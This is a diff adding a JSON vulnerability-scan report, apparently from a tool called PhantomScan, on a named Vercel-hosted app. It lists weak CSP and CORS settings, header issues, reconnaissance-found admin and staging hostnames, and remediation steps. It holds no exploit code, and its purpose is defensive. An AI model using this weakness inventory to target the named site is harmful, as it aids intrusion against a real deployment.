+      "impact": "Attackers fingerprint stack for targeted exploits",
+      "fix": "Remove or obfuscate the 'server' header in server config",
+      "endpoint": "",
+      "cve_id": null,
+      "cvss_score": null
+    },
+    {
+      "agent": "Browser Security Agent",
+      "title": "CSP missing or weak with browser-observed script surfaces",
+      "category": "CSP",
+      "severity": "LOW",
+      "confidence": "HIGH",
+      "target": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+      "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+      "evidence": "CSP status: missing. Weaknesses: CSP header missing. Related observations: {\"external_script_origins\": [], \"inline_script_blocks\": 0, \"user_controlled_inputs\": 0, \"api_calls\": 0, \"console_errors\": 0, \"javascript_sinks\": [], \"previous_related_findings\": 0}",
+      "impact": "Weak CSP increases the impact of client-side injection and third-party script compromise.",
+      "recommendation": "Deploy a restrictive CSP including script-src, object-src 'none', base-uri, frame-ancestors, and form-action.",
+      "verification": "Rerun Browser observation and confirm CSP parses as strong with no violation events.",
+      "timestamp": "2026-07-29T14:25:16.5_*1530+00:00",
+      "cve_id": null,
+      "cvss_score": null,
+      "parameter": null,
+      "module": "csp_analysis",
+      "recommended_fix": "Define and enforce a restrictive Content-Security-Policy.",
+      "remediation_status": "OPEN",
+      "verification_status": "NOT_VERIFIED",
+      "risk_status": "ACTIVE"
+    },
+    {
+      "agent": "API Security Agent",
+      "title": "API response permits reads from any origin",
+      "category": "API Security",
+      "severity": "LOW",
+      "confidence": "MEDIUM",
+      "target": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+      "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+      "evidence": "Captured response sets Access-Control-Allow-Origin: *.",
+      "impact": "The policy may expose browser-readable API data to untrusted sites; conforming browsers reject the wildcard/credentials combination but it signals unsafe policy intent.",
+      "recommendation": "Allow only required trusted origins and enable credentials only for endpoints that need them.",
+      "verification": "Send approved requests from trusted and untrusted origins and confirm only trusted origins receive an allow-origin response.",
+      "timestamp": "2026-07-29T14:25:15.598969+00:00",
+      "cve_id": null,
+      "cvss_score": null,
+      "parameter": null,
+      "module": null,
+      "recommended_fix": null,
+      "remediation_status": "OPEN",
+      "verification_status": "NOT_VERIFIED",
+      "risk_status": "ACTIVE"
+    },
+    {
+      "agent": "Infrastructure Agent",
+      "title": "Content Security Policy permits unsafe script execution",
+      "category": "Infrastructure Security",
+      "severity": "MEDIUM",
+      "confidence": "HIGH",
+      "target": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+      "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+      "evidence": "The captured CSP script policy includes unsafe-inline or unsafe-eval; nonce and hash values are omitted from evidence.",
+      "impact": "The policy provides reduced protection if attacker-controlled script or markup reaches the page.",
+      "recommendation": "Remove unsafe-eval and migrate inline scripts to nonces or hashes with narrowly scoped sources.",
+      "verification": "Capture the policy after deployment and confirm scripts work without unsafe-eval or broad unsafe-inline allowances.",
+      "timestamp": "2026-07-29T14:25:15.632601+00:00",
+      "cve_id": null,
+      "cvss_score": null,
+      "parameter": null,
+      "module": null,
+      "recommended_fix": null,
+      "remediation_status": "OPEN",
+      "verification_status": "NOT_VERIFIED",
+      "risk_status": "ACTIVE"
+    },
+    {
+      "agent": "Threat Intelligence Agent",
+      "title": "Non-production or administrative hostnames discovered",
+      "category": "Threat Intelligence",
+      "severity": "LOW",
+      "confidence": "POTENTIAL",
+      "target": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+      "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+      "evidence": "Supplied reconnaissance includes sensitive-looking hostname(s): admin.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app, beta.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app, dev.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app, internal.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app, old.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app, staging.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app, test.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app.",
+      "impact": "Forgotten or less-hardened environments can expand the externally reachable attack surface.",
+      "recommendation": "Inventory each hostname, retire unused systems, and apply production-equivalent access controls and patching.",
+      "verification": "Confirm ownership, purpose, and access policy for every listed hostname.",
+      "timestamp": "2026-07-29T14:25:15.614020+00:00",
+      "cve_id": null,
+      "cvss_score": null,
+      "parameter": null,
+      "module": null,
+      "recommended_fix": null,
+      "remediation_status": "OPEN",
+      "verification_status": "NOT_VERIFIED",
+      "risk_status": "ACTIVE"
+    }
+  ],
+  "markdown_report": "# PhantomScan Remediation Checklist\n\n## HIGH\n\n- [ ] **[HIGH]** CSP allows unsafe-inline scripts\n  - Affected: https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/\n  - Fix: `Remove 'unsafe-inline' from script-src; use nonces or hashes`\n  - Owner: frontend\n  - ETA: 4h\n\n## MEDIUM\n\n- [ ] **[MEDIUM]** Could not establish TLS connection\n  - Affected: https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/\n  - Fix: `Ensure HTTPS is properly configured`\n  - Owner: devops\n  - ETA: 1d\n\n- [ ] **[MEDIUM]** Content Security Policy permits unsafe script execution\n  - Affected: https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/\n  - Fix: `Remove unsafe-eval and migrate inline scripts to nonces or hashes with narrowly scoped sources.`\n  - Owner: backend\n  - ETA: 1d\n\n## LOW\n\n- [ ] **[LOW]** Missing Permissions-Policy\n  - Affected: https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/\n  - Fix: `Add: Permissions-Policy: geolocation=(), microphone=(), camera=()`\n  - Owner: backend\n  - ETA: 1w\n\n- [ ] **[LOW]** Server version disclosure\n  - Affected: https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/\n  - Fix: `Remove or obfuscate the 'server' header in server config`\n  - Owner: devops\n  - ETA: 1w\n\n- [ ] **[LOW]** API response permits reads from any origin\n  - Affected: https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/\n  - Fix: `Allow only required trusted origins and enable credentials only for endpoints that need them.`\n  - Owner: backend\n  - ETA: 1w\n\n- [ ] **[LOW]** Non-production or administrative hostnames discovered\n  - Affected: https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/\n  - Fix: `Inventory each hostname, retire unused systems, and apply production-equivalent access controls and patching.`\n  - Owner: backend\n  - ETA: 1w\n\n\n# Browser Observation Report\nEngine: http_fallback\nPages visited: 1\nNetwork events: 1\nAPIs discovered: 0\nConsole events: 0\nWebSockets: 0\nSafety pause: Unexpected redirect outside scope: https://vercel.com/sso-api?url=http_%2A%2A%2A%2A%2A%2A%2A%2A%2A%2A%2A%2Aapp%2F&nonce=3e5d_%2A%2A%2A%2A%2A%2A%2A%2A%2A%2A%2A%2Af00e\n- [LOW/HIGH] CSP missing or weak with browser-observed script surfaces",
+  "active_security": null,
+  "browser_security": {
+    "status": "complete",
+    "target_url": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+    "browser_engine": "http_fallback",
+    "session": "[REDACTED]",
+    "pages": [
+      {
+        "url": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+        "title": "",
+        "status": 302
+      }
+    ],
+    "routes": [
+      {
+        "route": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+        "source": "browser_navigation"
+      }
+    ],
+    "dom": [
+      {
+        "page": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+        "forms": [],
+        "inputs": [],
+        "hidden_inputs": [],
+        "iframes": [],
+        "scripts": [],
+        "links": [],
+        "event_handlers": [],
+        "inline_script_count": 0,
+        "inline_scripts": [],
+        "websocket_urls": [],
+        "auth_forms": [],
+        "file_uploads": []
+      }
+    ],
+    "network_events": [
+      {
+        "url": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+        "method": "GET",
+        "resource_type": "document",
+        "classification": "DOCUMENT",
+        "status": 302,
+        "content_type": "text/plain",
+        "duration_ms": 140.0,
+        "initiator": "browser_observer",
+        "redirect_chain": [],
+        "request_headers_summary": {
+          "user-agent": "PhantomScan-BrowserObservation/1.0"
+        },
+        "response_headers_summary": {
+          "cache-control": "no-store, max-age=0",
+          "content-type": "text/plain",
+          "location": "https://vercel.com/sso-api?url=https%3A%2F%2Fnyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app%2F&nonce=3e5d7fbd29e1ffc7f7c47069400b3a7acd027826604e0f0a9b8329e40355f00e",
+          "set-cookie": "[REDACTED]",
+          "strict-transport-security": "max-age=63072000; includeSubDomains; preload",
+          "x-frame-options": "DENY"
+        },
+        "authentication_state": "session_cookie_observed",
+        "response_schema": null,
+        "request_count": 1
+      }
+    ],
+    "console_events": [],
+    "api_inventory": [],
+    "storage": {
+      "localStorage": {},
+      "sessionStorage": {},
+      "indexedDB": {
+        "metadata_observed": false
+      },
+      "sensitive_client_storage": []
+    },
+    "cookies": [
+      {
+        "name": "_vercel_sso_nonce",
+        "secure": true,
+        "httponly": true,
+        "samesite": "Lax",
+        "domain": null,
+        "path": "/",
+        "expires": null
+      }
+    ],
+    "csp": [
+      {
+        "status": "missing",
+        "directives": {},
+        "report_only": false,
+        "weaknesses": [
+          "CSP header missing"
+        ]
+      }
+    ],
+    "csp_violations": [],
+    "javascript": [],
+    "source_maps": [],
+    "auth_flow": {
+      "steps": [
+        {
+          "type": "session",
+          "label": "Session cookie observed",
+          "cookie_count": 1
+        }
+      ],
+      "session_created": true,
+      "logout_observed": false,
+      "session_lifecycle": {
+        "creation": "cookie_or_token_observed",
+        "refresh": "not_observed",
+        "logout_invalidation": "not_observed"
+      }
+    },
+    "websockets": [],
+    "service_workers": [],
+    "cache": [],
+    "third_party": [],
+    "dataflow": {
+      "input_to_api": [],
+      "api_to_dom": [],
+      "sink_classifications": []
+    },
+    "screenshots": [],
+    "safety": {
+      "target_origin": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app",
+      "max_pages": 8,
+      "page_count": 1,
+      "safety_paused": true,
+      "pause_reason": "Unexpected redirect outside scope: https://vercel.com/sso-api?url=http_%2A%2A%2A%2A%2A%2A%2A%2A%2A%2A%2A%2Aapp%2F&nonce=3e5d_%2A%2A%2A%2A%2A%2A%2A%2A%2A%2A%2A%2Af00e",
+      "repeated_server_errors": 0,
+      "latency_spikes": 0,
+      "events": [
+        {
+          "event": "response_observed",
+          "url": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+          "status": 302,
+          "duration_ms": 140.0
+        },
+        {
+          "event": "SAFETY_PAUSE",
+          "reason": "Unexpected redirect outside scope: https://vercel.com/sso-api?url=http_%2A%2A%2A%2A%2A%2A%2A%2A%2A%2A%2A%2Aapp%2F&nonce=3e5d_%2A%2A%2A%2A%2A%2A%2A%2A%2A%2A%2A%2Af00e"
+        }
+      ]
+    },
+    "request_count": 1,
+    "findings": [
+      {
+        "title": "CSP missing or weak with browser-observed script surfaces",
+        "category": "CSP",
+        "severity": "LOW",
+        "confidence": "HIGH",
+        "target": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+        "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+        "evidence": "CSP status: missing. Weaknesses: CSP header missing. Related observations: {\"external_script_origins\": [], \"inline_script_blocks\": 0, \"user_controlled_inputs\": 0, \"api_calls\": 0, \"console_errors\": 0, \"javascript_sinks\": [], \"previous_related_findings\": 0}",
+        "impact": "Weak CSP increases the impact of client-side injection and third-party script compromise.",
+        "recommendation": "Deploy a restrictive CSP including script-src, object-src 'none', base-uri, frame-ancestors, and form-action.",
+        "verification": "Rerun Browser observation and confirm CSP parses as strong with no violation events.",
+        "agent": "Browser Security Agent",
+        "timestamp": "2026-07-29T14:25:16.5_*1530+00:00",
+        "cve_id": null,
+        "cvss_score": null,
+        "parameter": null,
+        "module": "csp_analysis",
+        "recommended_fix": "Define and enforce a restrictive Content-Security-Policy.",
+        "remediation_status": "OPEN",
+        "verification_status": "NOT_VERIFIED",
+        "risk_status": "ACTIVE"
+      }
+    ],
+    "browser_fallback_reason": "",
+    "correlation": {
+      "related_observations": {
+        "external_script_origins": [],
+        "inline_script_blocks": 0,
+        "user_controlled_inputs": 0,
+        "api_calls": 0,
+        "console_errors": 0,
+        "javascript_sinks": [],
+        "previous_related_findings": 0
+      },
+      "independent_signal_count": 0,
+      "confidence_hint": "POTENTIAL"
+    }
+  },
+  "ai_analyst_output": {
+    "generated_at": "2026-07-29T14:26:03.821881+00:00",
+    "ai_available": false,
+    "ai_status": "AI Analysis Unavailable - deterministic analysis shown",
+    "safety": {
+      "grounded_in_scan_evidence": true,
+      "can_start_active_test": false,
+      "active_tests": "recommend_only"
+    },
+    "security_summary": {
+      "overall_security_posture": "Moderate Risk",
+      "most_important_risks": [
+        "CSP allows unsafe-inline scripts",
+        "Content Security Policy permits unsafe script execution"
+      ],
+      "what_changed": "7 new finding(s), 1 new route(s)",
+      "immediate_attention": "2 priority items need immediate attention.",
+      "can_wait": [
+        "Could not establish TLS connection",
+        "Missing Permissions-Policy",
+        "Server version disclosure",
+        "API response permits reads from any origin",
+        "Non-production or administrative hostnames discovered"
+      ],
+      "positive_security_controls": [
+        "Secure cookies detected",
+        "HSTS enabled",
+        "No high-risk CVEs detected"
+      ],
+      "recommended_next_action": "Remove 'unsafe-inline' from script-src; use nonces or hashes",
+      "authentication_focus": "No high-confidence authentication findings in active risk set."
+    },
+    "ai_narrative": "",
+    "priorities": [
+      {
+        "priority": 1,
+        "finding_id": 298,
+        "title": "CSP allows unsafe-inline scripts",
+        "score": 64.25,
+        "severity": "HIGH",
+        "confidence": "MEDIUM",
+        "recommended_action": "Remove 'unsafe-inline' from script-src; use nonces or hashes",
+        "factors": [
+          "severity=HIGH",
+          "confidence=MEDIUM",
+          "internet or browser-reachable endpoint"
+        ],
+        "citation": {
+          "type": "finding",
+          "id": 298,
+          "label": "Finding #298",
+          "title": "CSP allows unsafe-inline scripts",
+          "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+          "source": "Finding"
+        }
+      },
+      {
+        "priority": 2,
+        "finding_id": 303,
+        "title": "Content Security Policy permits unsafe script execution",
+        "score": 53.0,
+        "severity": "MEDIUM",
+        "confidence": "HIGH",
+        "recommended_action": "Remove unsafe-eval and migrate inline scripts to nonces or hashes with narrowly scoped sources.",
+        "factors": [
+          "severity=MEDIUM",
+          "confidence=HIGH",
+          "internet or browser-reachable endpoint"
+        ],
+        "citation": {
+          "type": "finding",
+          "id": 303,
+          "label": "Finding #303",
+          "title": "Content Security Policy permits unsafe script execution",
+          "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+          "source": "Finding"
+        }
+      },
+      {
+        "priority": 3,
+        "finding_id": 300,
+        "title": "Could not establish TLS connection",
+        "score": 41.75,
+        "severity": "MEDIUM",
+        "confidence": "MEDIUM",
+        "recommended_action": "Ensure HTTPS is properly configured",
+        "factors": [
+          "severity=MEDIUM",
+          "confidence=MEDIUM",
+          "internet or browser-reachable endpoint"
+        ],
+        "citation": {
+          "type": "finding",
+          "id": 300,
+          "label": "Finding #300",
+          "title": "Could not establish TLS connection",
+          "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+          "source": "Finding"
+        }
+      },
+      {
+        "priority": 4,
+        "finding_id": 299,
+        "title": "Missing Permissions-Policy",
+        "score": 23.0,
+        "severity": "LOW",
+        "confidence": "MEDIUM",
+        "recommended_action": "Add: Permissions-Policy: geolocation=(), microphone=(), camera=()",
+        "factors": [
+          "severity=LOW",
+          "confidence=MEDIUM",
+          "internet or browser-reachable endpoint"
+        ],
+        "citation": {
+          "type": "finding",
+          "id": 299,
+          "label": "Finding #299",
+          "title": "Missing Permissions-Policy",
+          "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+          "source": "Finding"
+        }
+      },
+      {
+        "priority": 5,
+        "finding_id": 301,
+        "title": "Server version disclosure",
+        "score": 23.0,
+        "severity": "LOW",
+        "confidence": "MEDIUM",
+        "recommended_action": "Remove or obfuscate the 'server' header in server config",
+        "factors": [
+          "severity=LOW",
+          "confidence=MEDIUM",
+          "internet or browser-reachable endpoint"
+        ],
+        "citation": {
+          "type": "finding",
+          "id": 301,
+          "label": "Finding #301",
+          "title": "Server version disclosure",
+          "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+          "source": "Finding"
+        }
+      },
+      {
+        "priority": 6,
+        "finding_id": 302,
+        "title": "API response permits reads from any origin",
+        "score": 23.0,
+        "severity": "LOW",
+        "confidence": "MEDIUM",
+        "recommended_action": "Allow only required trusted origins and enable credentials only for endpoints that need them.",
+        "factors": [
+          "severity=LOW",
+          "confidence=MEDIUM",
+          "internet or browser-reachable endpoint"
+        ],
+        "citation": {
+          "type": "finding",
+          "id": 302,
+          "label": "Finding #302",
+          "title": "API response permits reads from any origin",
+          "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+          "source": "Finding"
+        }
+      },
+      {
+        "priority": 7,
+        "finding_id": 304,
+        "title": "Non-production or administrative hostnames discovered",
+        "score": 15.0,
+        "severity": "LOW",
+        "confidence": "POTENTIAL",
+        "recommended_action": "Inventory each hostname, retire unused systems, and apply production-equivalent access controls and patching.",
+        "factors": [
+          "severity=LOW",
+          "confidence=POTENTIAL",
+          "internet or browser-reachable endpoint"
+        ],
+        "citation": {
+          "type": "finding",
+          "id": 304,
+          "label": "Finding #304",
+          "title": "Non-production or administrative hostnames discovered",
+          "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+          "source": "Finding"
+        }
+      }
+    ],
+    "related_security_chains": [
+      {
+        "title": "Related Security Chain: CSP allows unsafe-inline scripts",
+        "primary": {
+          "type": "finding",
+          "id": 298,
+          "label": "Finding #298",
+          "title": "CSP allows unsafe-inline scripts",
+          "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+          "source": "Finding"
+        },
+        "related": [
+          {
+            "type": "finding",
+            "id": 299,
+            "label": "Finding #299",
+            "title": "Missing Permissions-Policy",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Related finding"
+          },
+          {
+            "type": "finding",
+            "id": 300,
+            "label": "Finding #300",
+            "title": "Could not establish TLS connection",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Related finding"
+          },
+          {
+            "type": "finding",
+            "id": 301,
+            "label": "Finding #301",
+            "title": "Server version disclosure",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Related finding"
+          },
+          {
+            "type": "finding",
+            "id": 302,
+            "label": "Finding #302",
+            "title": "API response permits reads from any origin",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Related finding"
+          },
+          {
+            "type": "finding",
+            "id": 303,
+            "label": "Finding #303",
+            "title": "Content Security Policy permits unsafe script execution",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Related finding"
+          }
+        ],
+        "explanation": "These observations share an endpoint, category/module, or CVE context. PhantomScan does not label this an exploit chain without direct proof."
+      },
+      {
+        "title": "Related Security Chain: Missing Permissions-Policy",
+        "primary": {
+          "type": "finding",
+          "id": 299,
+          "label": "Finding #299",
+          "title": "Missing Permissions-Policy",
+          "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+          "source": "Finding"
+        },
+        "related": [
+          {
+            "type": "finding",
+            "id": 298,
+            "label": "Finding #298",
+            "title": "CSP allows unsafe-inline scripts",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Related finding"
+          },
+          {
+            "type": "finding",
+            "id": 300,
+            "label": "Finding #300",
+            "title": "Could not establish TLS connection",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Related finding"
+          },
+          {
+            "type": "finding",
+            "id": 301,
+            "label": "Finding #301",
+            "title": "Server version disclosure",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Related finding"
+          },
+          {
+            "type": "finding",
+            "id": 302,
+            "label": "Finding #302",
+            "title": "API response permits reads from any origin",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Related finding"
+          },
+          {
+            "type": "finding",
+            "id": 303,
+            "label": "Finding #303",
+            "title": "Content Security Policy permits unsafe script execution",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Related finding"
+          }
+        ],
+        "explanation": "These observations share an endpoint, category/module, or CVE context. PhantomScan does not label this an exploit chain without direct proof."
+      },
+      {
+        "title": "Related Security Chain: Could not establish TLS connection",
+        "primary": {
+          "type": "finding",
+          "id": 300,
+          "label": "Finding #300",
+          "title": "Could not establish TLS connection",
+          "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+          "source": "Finding"
+        },
+        "related": [
+          {
+            "type": "finding",
+            "id": 298,
+            "label": "Finding #298",
+            "title": "CSP allows unsafe-inline scripts",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Related finding"
+          },
+          {
+            "type": "finding",
+            "id": 299,
+            "label": "Finding #299",
+            "title": "Missing Permissions-Policy",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Related finding"
+          },
+          {
+            "type": "finding",
+            "id": 301,
+            "label": "Finding #301",
+            "title": "Server version disclosure",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Related finding"
+          },
+          {
+            "type": "finding",
+            "id": 302,
+            "label": "Finding #302",
+            "title": "API response permits reads from any origin",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Related finding"
+          },
+          {
+            "type": "finding",
+            "id": 303,
+            "label": "Finding #303",
+            "title": "Content Security Policy permits unsafe script execution",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Related finding"
+          }
+        ],
+        "explanation": "These observations share an endpoint, category/module, or CVE context. PhantomScan does not label this an exploit chain without direct proof."
+      },
+      {
+        "title": "Related Security Chain: Server version disclosure",
+        "primary": {
+          "type": "finding",
+          "id": 301,
+          "label": "Finding #301",
+          "title": "Server version disclosure",
+          "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+          "source": "Finding"
+        },
+        "related": [
+          {
+            "type": "finding",
+            "id": 298,
+            "label": "Finding #298",
+            "title": "CSP allows unsafe-inline scripts",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Related finding"
+          },
+          {
+            "type": "finding",
+            "id": 299,
+            "label": "Finding #299",
+            "title": "Missing Permissions-Policy",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Related finding"
+          },
+          {
+            "type": "finding",
+            "id": 300,
+            "label": "Finding #300",
+            "title": "Could not establish TLS connection",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Related finding"
+          },
+          {
+            "type": "finding",
+            "id": 302,
+            "label": "Finding #302",
+            "title": "API response permits reads from any origin",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Related finding"
+          },
+          {
+            "type": "finding",
+            "id": 303,
+            "label": "Finding #303",
+            "title": "Content Security Policy permits unsafe script execution",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Related finding"
+          }
+        ],
+        "explanation": "These observations share an endpoint, category/module, or CVE context. PhantomScan does not label this an exploit chain without direct proof."
+      },
+      {
+        "title": "Related Security Chain: API response permits reads from any origin",
+        "primary": {
+          "type": "finding",
+          "id": 302,
+          "label": "Finding #302",
+          "title": "API response permits reads from any origin",
+          "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+          "source": "Finding"
+        },
+        "related": [
+          {
+            "type": "finding",
+            "id": 298,
+            "label": "Finding #298",
+            "title": "CSP allows unsafe-inline scripts",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Related finding"
+          },
+          {
+            "type": "finding",
+            "id": 299,
+            "label": "Finding #299",
+            "title": "Missing Permissions-Policy",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Related finding"
+          },
+          {
+            "type": "finding",
+            "id": 300,
+            "label": "Finding #300",
+            "title": "Could not establish TLS connection",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Related finding"
+          },
+          {
+            "type": "finding",
+            "id": 301,
+            "label": "Finding #301",
+            "title": "Server version disclosure",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Related finding"
+          },
+          {
+            "type": "finding",
+            "id": 303,
+            "label": "Finding #303",
+            "title": "Content Security Policy permits unsafe script execution",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Related finding"
+          }
+        ],
+        "explanation": "These observations share an endpoint, category/module, or CVE context. PhantomScan does not label this an exploit chain without direct proof."
+      },
+      {
+        "title": "Related Security Chain: Content Security Policy permits unsafe script execution",
+        "primary": {
+          "type": "finding",
+          "id": 303,
+          "label": "Finding #303",
+          "title": "Content Security Policy permits unsafe script execution",
+          "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+          "source": "Finding"
+        },
+        "related": [
+          {
+            "type": "finding",
+            "id": 298,
+            "label": "Finding #298",
+            "title": "CSP allows unsafe-inline scripts",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Related finding"
+          },
+          {
+            "type": "finding",
+            "id": 299,
+            "label": "Finding #299",
+            "title": "Missing Permissions-Policy",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Related finding"
+          },
+          {
+            "type": "finding",
+            "id": 300,
+            "label": "Finding #300",
+            "title": "Could not establish TLS connection",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Related finding"
+          },
+          {
+            "type": "finding",
+            "id": 301,
+            "label": "Finding #301",
+            "title": "Server version disclosure",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Related finding"
+          },
+          {
+            "type": "finding",
+            "id": 302,
+            "label": "Finding #302",
+            "title": "API response permits reads from any origin",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Related finding"
+          }
+        ],
+        "explanation": "These observations share an endpoint, category/module, or CVE context. PhantomScan does not label this an exploit chain without direct proof."
+      },
+      {
+        "title": "Related Security Chain: Non-production or administrative hostnames discovered",
+        "primary": {
+          "type": "finding",
+          "id": 304,
+          "label": "Finding #304",
+          "title": "Non-production or administrative hostnames discovered",
+          "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+          "source": "Finding"
+        },
+        "related": [
+          {
+            "type": "finding",
+            "id": 298,
+            "label": "Finding #298",
+            "title": "CSP allows unsafe-inline scripts",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Related finding"
+          },
+          {
+            "type": "finding",
+            "id": 299,
+            "label": "Finding #299",
+            "title": "Missing Permissions-Policy",
